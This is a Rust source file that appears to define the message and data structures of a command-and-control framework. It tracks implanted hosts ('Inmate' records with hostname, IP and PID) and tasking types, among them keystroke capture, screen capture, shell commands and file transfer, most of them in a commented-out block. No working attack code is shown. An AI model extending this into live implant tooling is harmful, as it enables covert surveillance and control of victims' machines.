use serde::{Serialize, Deserialize};
pub mod actions;
use actions::{c2_actions, RequestActionType, ResponseActionType};


#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct CheckInResponse {
    pub task: c2_actions,
    pub task_parameters: String,
}

#[derive(Serialize, Deserialize, Debug)]
pub struct PostRequest {
    pub timestamp: u64,
    pub action_type: c2_actions,
    pub action_parameters: String,
    pub content: Vec<u8>,
}

impl PostRequest {
    pub fn new(timestamp: u64, action_type: c2_actions, action_parameters: String, content: Vec<u8>) -> Self {
        PostRequest {
            timestamp,
            action_type,
            action_parameters,
            content,
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct PostRequestHeaders {
    pub timestamp: u64,
    pub action_type: c2_actions,
    pub action_parameters: String,
}
impl PostRequestHeaders {
    pub fn new(timestamp: u64, action_type: c2_actions, action_parameters: String) -> Self {
        PostRequestHeaders {
            timestamp,
            action_type,
            action_parameters,
        }
    }
    pub fn from_post_request(post_req: PostRequest) -> Self {
        PostRequestHeaders {
            timestamp: post_req.timestamp,
            action_type: post_req.action_type,
            action_parameters: post_req.action_parameters,
        }
    }
    pub fn clone(&self) -> Self {
        PostRequestHeaders {
            timestamp: self.timestamp,
            action_type: self.action_type,
            action_parameters: self.action_parameters.clone(),
        }
    }
    pub fn copy(&self) -> Self {
        PostRequestHeaders {
            timestamp: self.timestamp,
            action_type: self.action_type,
            action_parameters: self.action_parameters.clone(),
        }
    }
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Inmate {
    pub rowid: u32,
    pub os: String,
    pub hostname: String,
    pub ip: String,
    pub pid: u32,
    pub last_checkin: u64,
    pub pending_instruct: String,
    pub pending_instruct_type: c2_actions,
    pub request_actions: Vec<CheckInResponse>,
    pub completed_actions: Vec<PostRequestHeaders>,
}
/* 

pub fn RequestActionFromString(action: &str) -> RequestActionType {
    match action {
        "Keystrokes" => return RequestActionType::Keystrokes,
        "ScreenCapture" => return RequestActionType::ScreenCapture,
        "FileUpload" => return  RequestActionType::FileUpload,
        "ShellResponse" => return RequestActionType::ShellResponse,
        "SystemInfo" => return RequestActionType::SystemInfo,
        "CheckIn" => return RequestActionType::CheckIn,
        _ => return RequestActionType::CheckIn,
    }
}
pub fn ResponseActionFromString(action: String) -> ResponseActionType {
    match action.as_str() {
        "CallAction" => return ResponseActionType::CallAction,
        "ShellCommand" => return ResponseActionType::ShellCommand,
        "FileDownload" => return ResponseActionType::FileDownload,
        "FileUpload" => return ResponseActionType::FileUpload,
        "Wait" => return ResponseActionType::Wait,
        _ => return ResponseActionType::Wait,
    }
}
#[derive(Debug)]
pub struct Inmate {
    pub rowid: i32,
    pub os: String,
    pub hostname: String,
    pub ip: String,
    pub pid: u32,
    pub last_checkin: u32,
    pub pending_instruct: String,
    pub pending_instruct_type: ResponseActionType,
}

pub fn add(left: u64, right: u64) -> u64 {
    left + right
}
#[derive(Serialize, Deserialize, Debug)]
pub struct C2Response {
    pub message_headers: ResponseHeaders,
    pub message_content: String,
}
impl C2Response {
    pub fn new(implant_id: String, timestamp: u64, action_type: ResponseActionType, message_content: String) -> Self {
        C2Response {
            message_headers: ResponseHeaders::new(implant_id, timestamp, action_type, "".to_string()),
            message_content,
        }
    }
}
#[derive(Serialize, Deserialize, Debug)]
pub struct ResponseHeaders {
    pub implant_id: String,
    pub timestamp: u64,
    pub action_type: ResponseActionType,
    pub action_parameters: String,
}

impl ResponseHeaders {
    pub fn new(implant_id: String, timestamp: u64, action_type: ResponseActionType, param: String) -> Self {
        ResponseHeaders {
            implant_id,
            timestamp,
            action_type,
            action_parameters: param,
        }
    }
}


#[derive(Serialize, Deserialize, Debug)]
pub struct RequestHeaders {
    pub implant_id: String,
    pub timestamp: u64,
    pub action_type: RequestActionType,
}

impl RequestHeaders {
    pub fn new(implant_id: String, timestamp: u64, action_type: RequestActionType) -> Self {
        RequestHeaders {
            implant_id,
            timestamp,
            action_type,
        }
    }
}

#[derive(Serialize, Deserialize, Debug)]
pub struct C2Request {
    pub message_headers: RequestHeaders,
    pub message_content: String,
}

impl C2Request {
    pub fn new(message_headers: RequestHeaders, message_content: String) -> Self {
        C2Request {
            message_headers,
            message_content,
        }
    }
}
#[derive(Serialize, Deserialize, Debug)]
pub struct Keystrokes {
    pub keys: Vec<String>,
    pub timestamp: u64,
}

impl Keystrokes {
    pub fn new(keys: Vec<String>, timestamp: u64) -> Self {
        Keystrokes { keys, timestamp }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn it_works() {
        let result = add(2, 2);
        assert_eq!(result, 4);
    }
}*/
